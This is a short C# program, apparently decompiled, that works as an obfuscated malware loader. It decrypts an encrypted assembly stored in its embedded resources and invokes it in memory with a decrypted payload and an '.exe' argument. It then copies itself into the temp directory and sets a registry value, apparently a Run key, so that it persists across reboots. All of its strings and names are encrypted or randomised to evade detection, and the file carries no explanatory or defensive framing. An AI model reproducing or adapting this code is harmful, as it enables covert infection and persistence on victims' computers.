using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public class OnnOXjMf
{
	[STAThread]
	public static void Main()
	{
		string fullyQualifiedName = Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName;
		Thread.Sleep(0);
		ResourceManager resourceManager = new ResourceManager("ZZBJ", Assembly.GetExecutingAssembly());
		string text = JnlTIcTKXhRQEEf.QOTEwE("t098N69hk6zC1U0SXZxjyw==", "spNwHNJVlm");
		Assembly.Load(JnlTIcTKXhRQEEf.rfBqhv((byte[])NewLateBinding.LateIndexGet(resourceManager.GetObject("BizlpPEBuNKhDbh"), new object[1] { 1 }, (string[])null), "MPSKixqaILfIMak")).GetType(JnlTIcTKXhRQEEf.QOTEwE("4lImy7S9JAY=", "FxFjvv"))!.GetMethod(JnlTIcTKXhRQEEf.QOTEwE("aQzXcHmeq6vK8BBycIo72g==", "bHQQPT"))!.Invoke(null, new object[6]
		{
			JnlTIcTKXhRQEEf.rfBqhv((byte[])NewLateBinding.LateIndexGet(resourceManager.GetObject("BizlpPEBuNKhDbh"), new object[1] { 0 }, (string[])null), "sGuPFvKUDDpcEZm"),
			true,
			text,
			".exe",
			true,
			false
		});
		if (Operators.CompareString(fullyQualifiedName, Path.GetTempPath() + JnlTIcTKXhRQEEf.QOTEwE("Z94H+hn0dlBVk3wf+Q0NeQ==", "NLQC"), false) != 0)
		{
			File.Copy(fullyQualifiedName, Path.GetTempPath() + JnlTIcTKXhRQEEf.QOTEwE("Z94H+hn0dlBVk3wf+Q0NeQ==", "NLQC"), overwrite: true);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(JnlTIcTKXhRQEEf.QOTEwE("LGhXFiwJili/f+vhYUjdmTMSF4LrF6Q81IX1e1Syj6nEj8x0O2LiVkEI7vnBl7ey", "vlRM"), writable: true);
			registryKey.SetValue(JnlTIcTKXhRQEEf.QOTEwE("7npPySIaidKDU38p7oTTag==", "uCfH"), Path.GetTempPath() + JnlTIcTKXhRQEEf.QOTEwE("Z94H+hn0dlBVk3wf+Q0NeQ==", "NLQC"), RegistryValueKind.String);
			registryKey.Close();
		}
	}
}
